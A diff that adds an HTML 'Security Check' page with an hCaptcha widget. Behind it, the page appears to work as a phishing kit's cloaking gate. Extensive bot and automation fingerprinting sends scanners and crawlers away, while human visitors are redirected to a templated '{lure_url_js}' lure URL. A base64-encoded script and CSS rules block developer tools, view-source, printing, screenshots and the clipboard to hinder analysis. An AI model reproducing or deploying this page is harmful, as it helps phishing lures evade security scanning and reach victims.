@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Security Check</title>
+    <meta name='referrer' content='no-referrer'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=yes">
+    <script src="https://hcaptcha.com/1/api.js" async defer></script>
+    <script src="data:text/javascript;base64,ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5dXAiLCBmdW5jdGlvbiAoZSkgewogICAgICAgIGxldCBrZXlDb2RlID0gZS5rZXlDb2RlID8gZS5rZXlDb2RlIDogZS53aGljaDsKICAgICAgICBpZiAoa2V5Q29kZSA9PSA0NCkgewogICAgICAgICAgICBuYXZpZ2F0b3IuY2xpcGJvYXJkLndyaXRlVGV4dCgiIik7CiAgICAgICAgfQogICAgfSk7CiAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXl1cCcsIChlKSA9PiB7CiAgICAgICAgaWYgKGUua2V5ID09ICdQcmludFNjcmVlbicpIHsKICAgICAgICAgICAgbmF2aWdhdG9yLmNsaXBib2FyZC53cml0ZVRleHQoIiIpOwogICAgICAgIH0KICAgIH0pOwogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsIChlKSA9PiB7CiAgICAgICAgaWYgKGUuY3RybEtleSAmJiBlLmtleSA9PSAncCcpIHsKICAgICAgICAgICAgZS5jYW5jZWxCdWJibGUgPSB0cnVlOwogICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgIGUuc3RvcEltbWVkaWF0ZVByb3BhZ2F0aW9uKCk7CiAgICAgICAgfQogICAgfSk7CiAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsIGFzeW5jKGUpID0+IHsKICAgICAgICBpZiAoZS5jdHJsS2V5ICYmIChlLndoaWNoID09IDgzKSkgewogICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7IHJldHVybiBmYWxzZX0KICAgIH0pOwogICAgd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2NvbnRleHRtZW51JywgZXZlbnQgPT4gZXZlbnQucHJldmVudERlZmF1bHQoKSk7CiAgICBkb2N1bWVudC5vbmtleWRvd24gPSAoZSkgPT4gewogICAgICAgIGlmIChldmVudC5rZXlDb2RlID09IDEyMykge3JldHVybiBmYWxzZX0KICAgICAgICBpZiAoZS5jdHJsS2V5ICYmIGUua2V5Q29kZSA9PSAnRScuY2hhckNvZGVBdCgwKSkge3JldHVybiBmYWxzZX0KICAgICAgICBpZiAoZS5jdHJsS2V5ICYmIGUuc2hpZnRLZXkgJiYgZS5rZXlDb2RlID09ICdJJy5jaGFyQ29kZUF0KDApKSB7cmV0dXJuIGZhbHNlfQogICAgICAgIGlmIChlLmN0cmxLZXkgJiYgZS5zaGlmdEtleSAmJiBlLmtleUNvZGUgPT0gJ0onLmNoYXJDb2RlQXQoMCkpIHtyZXR1cm4gZmFsc2V9CiAgICAgICAgaWYgKGUuY3RybEtleSAmJiBlLmtleUNvZGUgPT0gJ1UnLmNoYXJDb2RlQXQoMCkpIHtyZXR1cm4gZmFsc2V9CiAgICAgICAgaWYgKGUuY3RybEtleSAmJiBlLmtleUNvZGUgPT0gJ1MnLmNoYXJDb2RlQXQoMCkpIHtyZXR1cm4gZmFsc2V9CiAgICAgICAgaWYgKGUuY3RybEtleSAmJiBlLmtleUNvZGUgPT0gJ0gnLmNoYXJDb2RlQXQoMCkpIHtyZXR1cm4gZmFsc2V9CiAgICAgICAgaWYgKGUuY3RybEtleSAmJiBlLmtleUNvZGUgPT0gJ0EnLmNoYXJDb2RlQXQoMCkpIHtyZXR1cm4gZmFsc2V9CiAgICAgICAgaWYgKGUuY3RybEtleSAmJiBlLmtleUNvZGUgPT0gJ0YnLmNoYXJDb2RlQXQoMCkpIHtyZXR1cm4gZmFsc2V9CiAgICAgICAgaWYgKGUuY3RybEtleSAmJiBlLmtleUNvZGUgPT0gJ0UnLmNoYXJDb2RlQXQoMCkpIHtyZXR1cm4gZmFsc2V9CiAgICB9OwoKICAgIHdpbmRvdy5vbmtleWRvd24gPSAoZSkgPT4gewogICAgICAgIHJldHVybiAhKGUuY3RybEtleSAmJiAoZS5rZXlDb2RlID09PSA2NyB8fCBlLmtleUNvZGUgPT09IDg1IHx8IGUua2V5Q29kZSA9PT0gODggfHwgZS5rZXlDb2RlID09PSAxMTcpKTsKICAgIH07"></script>
+    <script>
+        /** TO DISABLE CONTEXT MENU **/
+        setTimeout(() => redirectAway(), 10 * 60 * 1000);
+
+        /**
+         * (c) 2021 Joe Rutkowski
+         * Joe <@> dreggle <.> com
+         **/
+
+        let malicedetect = (function(callback) {
+            let eva = eval;
+            function check() {
+                if (checkUA() || checkPrototype() || checkVars() || checkLanguages() || checkScreen()) {
+                    return callback({status: 'failed'});
+                }
+                return callback({status: 'passed'});
+            }
+
+            function checkPrototype() {
+                let n = navigator;
+                try {
+                    if (PluginArray.prototype === n.plugins.__proto__ === false) return true;
+                } catch (e) {}
+                try {
+                    if (Plugin.prototype === n.plugins[0].__proto__ === false) return true;
+                } catch (e) {}
+                try {
+                    if (MimeTypeArray.prototype === n.mimeTypes.__proto__ === false) return true;
+                } catch (e) {}
+                try {
+                    if (MimeType.prototype === n.mimeTypes[0].__proto__ === false) return true;
+                } catch (e) {}
+                return false;
+            }
+
+            function checkVars() {
+                let d = document, n = navigator, e = d.documentElement,
+                    windowBotVars = ['webdriver', '_Selenium_IDE_Recorder', 'callSelenium', '_selenium', 'callPhantom', '_phantom', 'phantom', '__nightmare'],
+                    navigatorBotVars = ['webdriver', '__webdriver_script_fn', '__driver_evaluate', '__webdriver_evaluate', '__selenium_evaluate', '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_evaluate', '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_unwrapped', '__fxdriver_unwrapped', '__webdriver_script_func'],
+                    documentBotAttributes = ['webdriver', 'selenium', 'driver'];
+
+                for (let i = 0; i < windowBotVars.length; i++)
+                    if (windowBotVars[i] in window) return true;
+
+                for (let i = 0; i < navigatorBotVars.length; i++)
+                    if (navigatorBotVars[i] in n) return true;
+
+                for (let i = 0; i < documentBotAttributes.length; i++)
+                    if (e.getAttribute(documentBotAttributes[i]) !== null) return true;
+
+                return false;
+            }
+
+            function checkRTT() {
+                let connection = navigator.connection;
+                let connectionRtt = connection ? connection.rtt : -1;
+                return connectionRtt === 0;
+            }
+
+            function checkLanguages() {
+                if (isIE()) return false;
+                let n = navigator;
+                try {
+                    let language = n.language;
+                    let languagesLength = n.languages.length;
+                    if (!language || languagesLength === 0)
+                        return true;
+                } catch (e) {}
+                return false;
+            }
+
+            function checkPlugins() {
+                if (isIE() || isFirefox()) return false;
+                let n = navigator;
+                if (!n.plugins) return false;
+                return n.plugins.length === 0
+            }
+
+            function checkScreen() {
+                let w = window;
+                return w.outerWidth == 0 && w.outerHeight == 0
+            }
+
+            function checkUA() {
+                let n = navigator, u = n.userAgent;
+                if (u.substr(0, 11) !== "Mozilla/5.0") return false;
+
+                if (u.match(new RegExp(['headless', 'bot', 'crawl', 'index', 'archive', 'spider', 'http', 'google', 'bing', 'yahoo', 'msn', 'yandex', 'facebook'].join('|'), 'i'))) return false;
+
+                if (u.match(new RegExp(['Mobile', 'Tablet', 'Android', 'iPhone', 'iPad', 'iPod'].join('|')))) {
+                    if (n.maxTouchPoints < 1 || !touchSupport()) return false;
+                }
+
+                if (u.match(new RegExp('Safari'))) {
+                    if (u.match(new RegExp('Chrome'))) {
+                        if (u.match(new RegExp('Edge'))) {
+                            return !isEdgeHTML() || !checkEdgeHTML()
+                        } else {
+                            return !isChrome() || !checkChrome()
+                        }
+                    } else if (u.match(new RegExp('Mobile Safari'))) {
+                        return !isSafari() || !isMobileSafari() || !checkSafari()
+                    } else {
+                        return !isSafari() || !checkSafari()
+                    }
+                } else if (u.match(new RegExp('Firefox'))) {
+                    return !isFirefox() || !checkFirefox()
+                } else if (u.match(new RegExp(['Trident', 'MSIE'].join('|')))) {
+                    return !isIE() || !checkMSIE()
+                }
+                return true;
+            }
+
+            function reduce(e) {
+                return e.reduce((function(e, t) {return e + (t ? 1 : 0)}), 0)
+            }
+
+            function isIE() {
+                let w = window, n = navigator;
+                return reduce(["MSCSSMatrix" in w, "msSetImmediate" in w, "msIndexedDB" in w, "msMaxTouchPoints" in n, "msPointerEnabled" in n]) >= 4
+            }
+
+            function isChrome() {
+                let w = window, n = navigator;
+                return reduce(["webkitPersistentStorage" in n, "webkitTemporaryStorage" in n, 0 === n.vendor.indexOf("Google"), "webkitResolveLocalFileSystemURL" in w, "BatteryManager" in w, "webkitMediaStream" in w, "webkitSpeechGrammar" in w]) >= 5
+            }
+
+            function isSafari() {
+                let w = window, n = navigator;
+                return reduce(["ApplePayError" in w, "CSSPrimitiveValue" in w, "Counter" in w, "WebKitMediaKeys" in w, 0 === n.vendor.indexOf("Apple"), "getStorageUpdates" in n]) >= 4
+            }
+
+            function isMobileSafari() {
+                let w = window, n = navigator;
+                return reduce(["safari" in w, !("DeviceMotionEvent" in w), !("ongestureend" in w), !("standalone" in n)]) >= 3
+            }
+
+            function isEdgeHTML() {
+                let w = window, n = navigator;
+                return reduce(["msWriteProfilerMark" in w, "MSStream" in w, "msLaunchUri" in n, "msSaveBlob" in n]) >= 3 && !isIE()
+            }
+
+            function isFirefox() {
+                return !isIE() && !isChrome() && !isSafari() && !isMobileSafari() && !isEdgeHTML();
+            }
+
+            function checkChrome() {
+                if (toStringLength(eva) != 33) return false;
+                if (checkRTT()) return false;
+                return !navigator.userAgent.match(new RegExp('Mobile|Tablet|Android', "i")) == false && checkPlugins();
+            }
+
+            function checkFirefox() {
+                return toStringLength(eva) == 37;
+            }
+
+            function checkSafari() {
+                return toStringLength(eva) == 37;
+            }
+
+            function checkMSIE() {
+                return toStringLength(eva) == 39;
+            }
+
+            function checkEdgeHTML() {
+                return toStringLength(eva) == 33;
+            }
+
+            function touchSupport() {
+
+                let ts = "ontouchstart" in window, d = document;
+                if (ts) return ts;
+                try {d.createEvent("TouchEvent");ts = true} catch (r) {ts = false}
+                return ts;
+            }
+
+            function toStringLength(a) {
+                return a.toString().length;
+            }
+            return check();
+        });
+
+        /** BOTGUARD **/
+        const botdPromise = import('./botguard.js').then((Botd) => Botd.load());
+        botdPromise.then((botd) => botd.detect())
+            .then((result) => {
+                console.log(result);
+                if (result.bot) {redirectAway()}
+            })
+            .catch((error) => console.error(error))
+
+        setInterval(() => {try {window.clipboardData.setData('text', "Access Restricted")} catch {}}, 300);
+
+        function redirectAway() {
+            let link = document.createElement("a");
+            link.assign = "https://example.org/";
+            link.referrerPolicy = "no-referrer";
+            console.log('Bot detected');
+            link.rel = "noreferrer";
+            document.referrer = "";
+            document.cookie = "";
+            link.click();
+        }
+
+        function redirectVisitor() {
+            window.location.replace("{lure_url_js}")
+        }
+
+        async function runBotDetection() {
+            let documentDetectionKeys = [
+                "webdriver",
+                "_WEBDRIVER_ELEM_CACHE",
+                "ChromeDriverw",
+                "Geckowebdriver",
+                "driver-evaluate",
+                "webdriver-evaluate",
+                "selenium-evaluate",
+                "selenium-webdriver",
+                "webdriverCommand",
+                "webdriver-evaluate-response",
+                "__webdriverFunc",
+                "__$webdriverAsyncExecutor",
+                "$wdc_asdjflasutopfhvcZLmcfl_",
+                "__lastWatirAlert",
+                "__lastWatirConfirm",
+                "__lastWatirPrompt",
+                "$chrome_asyncScriptInfo",
+                "$cdc_asdjflasutopfhvcZLmcfl_",
+                "__webdriver_evaluate",
+                "__selenium_evaluate",
+                "__webdriver_script_function",
+                "__webdriver_script_func",
+                "__webdriver_script_fn",
+                "__fxdriver_evaluate",
+                "__driver_unwrapped",
+                "__webdriver_unwrapped",
+                "__driver_evaluate",
+                "__selenium_unwrapped",
+                "__fxdriver_unwrapped"
+            ];
+
+            let windowDetectionKeys = [
+                "gecko",
+                "$wdc_asdjflasutopfhvcZLmcfl_",
+                "$cdc_asdjflasutopfhvcZLmcfl_",
+                "domAutomation",
+                "domAutomationController",
+                "__stopAllTimers",
+                "spawn",
+                "__driver_evaluate",
+                "__fxdriver_evaluate",
+                "__driver_unwrapped",
+                "__fxdriver_unwrapped",
+                "emit",
+                "__phantomas",
+                "callPhantom",
+                "geb",
+                "__$webdriverAsyncExecutor",
+                "fmget_targets",
+                "spynner_additional_js_loaded",
+                "watinExpressionResult",
+                "watinExpressionError",
+                "domAutomationController",
+                "calledPhantom",
+                "__webdriver_unwrapped",
+                "__webdriver_script_function",
+                "__webdriver_script_func",
+                "__webdriver_script_fn",
+                "__webdriver_evaluate",
+                "__webdriver__chr",
+                "__webdriverFuncgeb",
+                "__selenium_unwrapped",
+                "__selenium_evaluate",
+                "__lastWatirPrompt",
+                "cdc_adoQpoasnfa76pfcZLmcfl_Array",
+                "cdc_adoQpoasnfa76pfcZLmcfl_Promise",
+                "cdc_adoQpoasnfa76pfcZLmcfl_Symbol",
+                "OSMJIF",
+                "__lastWatirConfirm",
+                "__lastWatirAlert",
+                "calledSelenium",
+                "webdriver",
+                "marionette",
+                "puppeteer",
+                "Buffer",
+                "_phantom",
+                "__nightmare",
+                "_selenium",
+                "callPhantom",
+                "Cypress",
+                "callSelenium",
+                "_Selenium_IDE_Recorder"
+            ];
+
+            let documentSearchKeys = ["fminer", "geb", "nightmarejs", "rhino", "headless", "driver", "webdriver",
+                "marionette", "selenium", "phantom", "awesomium", "cef", "cefsharp", "coachjs"];
+            for (const windowDetectionKey in windowDetectionKeys) {
+                const windowDetectionKeyValue = windowDetectionKeys[windowDetectionKey];
+                if (window[windowDetectionKeyValue]) {
+                    return true;
+                }
+            }
+
+            for (const documentDetectionKey in documentDetectionKeys) {
+                const documentDetectionKeyValue = documentDetectionKeys[documentDetectionKey];
+                if (window["document"][documentDetectionKeyValue]) {
+                    return true;
+                }
+            }
+
+            for (const documentKey in window["document"]) {
+                if (documentKey.match(/\$[a-z]dc_/) && window["document"][documentKey]["cache_"]) {
+                    return true;
+                }
+            }
+
+            if (window["external"] && window["external"].toString() && (window["external"].toString()["indexOf"]("Sequentum") != -1)) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("nightmarejs")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("awesomium")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("cefsharp")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("coachjs")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("fminer")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("rhino")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("phantom")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("phantomjs")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("selenium")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("webdriver")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("driver")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("geckodriver")) return true;
+            if (window["document"]["documentElement"]["getAttribute"]("firefox.marionette")) return true;
+            for (const documentSearchKey in documentSearchKeys) {
+                const documentSearchKeyValue = documentSearchKeys[documentSearchKey];
+                if (window.document.documentElement.getAttribute(documentSearchKeyValue)) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        async function checkVisitorFingerprint() {
+            return false
+        }
+
+        (async () => {
+            if (await runBotDetection() == true) {redirectAway()}
+            if (await checkVisitorFingerprint() == true) {redirectAway()}
+            if (malicedetect((obj) => {return obj.status === "passed"}) == false) {
+                window.addEventListener("DOMContentLoaded", () => {
+                    document.getElementById("b-v").style.visibility = "visible";
+                })
+            } else {redirectVisitor()}
+        })();
+    </script>
+    <noscript>
+        <meta name='referrer' content='no-referrer'>
+        <meta http-equiv='refresh' content='0;url=https://example.com'/>
+    </noscript>
+    <noframes>
+        <meta name='referrer' content='no-referrer'>
+        <meta http-equiv='refresh' content='0;url=https://example.com'/>
+    </noframes>
+    <style>
+
+        /* We are stopping user from printing our webpage */
+        @media print {
+            html, body {
+                /* Hide the whole page */
+                display: none;
+                user-select: none;
+            }
+        }
+
+        body, html {
+            height: 100%
+        }
+
+        html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, font, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td {
+            margin: 0; padding: 0; border: 0; outline: 0;
+            font-family: -apple-system, helvetica, arial, sans-serif;
+            font-size: 14px;
+            vertical-align: baseline;
+        }
+
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Roboto, sans-serif
+        }
+
+        fieldset {
+            border: 1px solid #ebebeb;
+            padding: 16px
+        }
+
+        form label {
+            display: block;
+            line-height: 29px
+        }
+
+        form ul li {
+            margin-bottom: 10px
+        }
+
+        input {
+            font-family: -apple-system, helvetica, arial, sans-serif;
+            font-size: 14px
+        }
+
+        ul {
+            list-style: none
+        }
+
+        .sample-form {
+            width: 335px;
+            padding: 16px
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: lightgrey;
+        }
+
+        #hcaptcha-demo-submit {
+            vertical-align: middle;
+            border: 0;
+            text-align: center;
+            margin: 0 1rem;
+            font-weight: 300;
+            color: #fff !important;
+            align-items: center;
+            padding: 0.5em 1em;
+            display: none;
+            background-color: #477ED2;
+            font-size: 20px;
+            border-radius: 6px;
+            transition: transform 0.2s;
+            width: 273px;
+        }
+    </style>
+</head>
+<body id="b-v" style="visibility: hidden">
+<div style="text-align: center; padding: 70px 0;">
+</div>
+<br><br>
+<div class="sample-form" style="width: 340px; margin: 0 auto;">
+    <form id="hcaptcha-demo-form" method="POST">
+        <fieldset>
+            <legend>Protected by hCAPTCHA</legend>
+            <ul>
+                <li role="presentation">
+                    <div class="">
+                        <div class="h-captcha" data-sitekey="338af34c-7bcb-4c7c-900b-acbec73d7d43" data-callback="on_token"></div>
+                        <script>
+                            function on_token(token) {
+                                let subtn = document.getElementById("hcaptcha-demo-submit");
+                                if (subtn != null) {subtn.style.display = "block";
+                                    subtn.addEventListener("click", (e) => {
+                                        e.preventDefault ? e.preventDefault() : e.returnValue = false;
+                                        redirectVisitor();
+                                    });
+                                }
+                            }
+                        </script>
+                    </div>
+                </li>
+                <li>
+                    <input id="hcaptcha-demo-submit" type="submit" value="Submit">
+                </li>
+            </ul>
+        </fieldset>
+    </form>
+</div>
+</body>
+</html>
